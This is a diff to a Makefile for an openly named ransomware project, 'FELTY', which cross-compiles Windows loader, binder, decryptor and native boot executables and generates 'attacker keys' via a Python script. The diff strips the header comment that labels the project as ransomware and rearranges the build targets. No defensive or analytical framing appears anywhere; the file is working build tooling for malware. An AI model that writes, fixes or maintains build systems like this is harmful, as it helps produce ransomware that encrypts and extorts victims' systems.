@@ -1,7 +1,3 @@
-# ============================================================
-#  FELTY Ransomware Build System (Linux cross‑compile to Win)
-# ============================================================
-
 CC64 = x86_64-w64-mingw32-gcc
 CC32 = i686-w64-mingw32-gcc
 STRIP = strip
@@ -26,17 +22,14 @@ WIN32DIR = win32
 
 .PHONY: all clean combine combine_x64 combine_win32
 
-# Default builds everything except the combiner (combine is separate)
-all: dirs keygen x64 win32
+all: keygen x64 win32
 
-dirs:
-	mkdir -p $(X64DIR) $(WIN32DIR)
-
-keygen: $(KEYGEN_OUT)
-
+# ================== Key generation ==================
 $(KEYGEN_OUT): felty_keygen.py
 	@echo "[*] Generating attacker keys..."
 	$(PY) felty_keygen.py
+
+keygen: $(KEYGEN_OUT)
 
 # ================== 64-bit Binaries ==================
 x64: $(X64DIR)/felty_loader.exe $(X64DIR)/felty_binder.exe $(X64DIR)/felty_decrypt.exe $(X64DIR)/felty_boot.exe
@@ -78,7 +71,14 @@ $(WIN32DIR)/felty_boot.exe: $(SRC_BOOT) | $(WIN32DIR)
 	$(CC32) $(CFLAGS_BASE) -nostdlib -Wl,--subsystem,native -e _NtProcessStartup@4 -o $@ $< -lntdll
 	$(STRIP) --strip-all $@
 
-# ================== Combiner (single EXE) ==================
+# ================== Directory creation ==================
+$(X64DIR):
+	mkdir -p $(X64DIR)
+
+$(WIN32DIR):
+	mkdir -p $(WIN32DIR)
+
+# ================== Combiner ==================
 combine: combine_x64 combine_win32
 
 combine_x64: $(X64DIR)/felty_loader.exe $(X64DIR)/felty_binder.exe $(X64DIR)/felty_decrypt.exe $(SRC_COMBINER)
